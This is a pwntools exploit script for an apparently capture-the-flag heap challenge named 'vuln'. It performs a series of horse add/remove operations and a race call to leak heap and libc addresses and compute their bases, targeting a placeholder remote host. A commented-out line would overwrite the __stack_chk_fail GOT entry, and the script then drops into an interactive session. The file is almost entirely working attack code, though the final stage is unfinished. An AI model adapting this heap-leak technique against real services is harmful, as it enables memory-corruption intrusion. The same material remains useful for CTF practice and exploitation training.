#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./vuln"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def add_hourse(idx: int, name_len: int, name):
    p.sendlineafter(':', '1')
    p.sendlineafter('?', str(idx))
    p.sendlineafter('?', str(name_len))
    p.sendlineafter(':', name)

def remove_hourse(idx: int):
    p.sendlineafter(':', '2')
    p.sendlineafter('?', str(idx))

def race():
    p.sendlineafter(':', '3')


def secret(idx: int, new: int, name):
    p.sendlineafter(':', '0')
    p.sendlineafter('?', str(idx))
    p.sendlineafter(':', name)
    p.sendlineafter('?', str(new))

for i in range(12):
    add_hourse(i, 0x100, b'\xff')

for i in range(11, -1, -1):
    remove_hourse(i)

for i in range(8):
    add_hourse(i, 0x100, b'\xff')

race()
p.recvline()
p.recvuntil(b"\x0a\x20\x20\x20\x20")
leak = u32(p.recv(4))
log.info("heap leak: " + hex(leak))
heap_base = leak - 0x1b3a
log.info("heap base: " + hex(heap_base))
p.recvuntil(b'@')
leak = u64(b'@' + p.recv(5) + b'\0' * 2)
log.info("libc leak: " + hex(leak))
libc_base = leak - 0x1be040
libc.address = libc_base
log.info("libc base: " + hex(libc_base))


#secret(0, 6, p64(elf.got["__stack_chk_fail"]) * 2)

p.interactive()
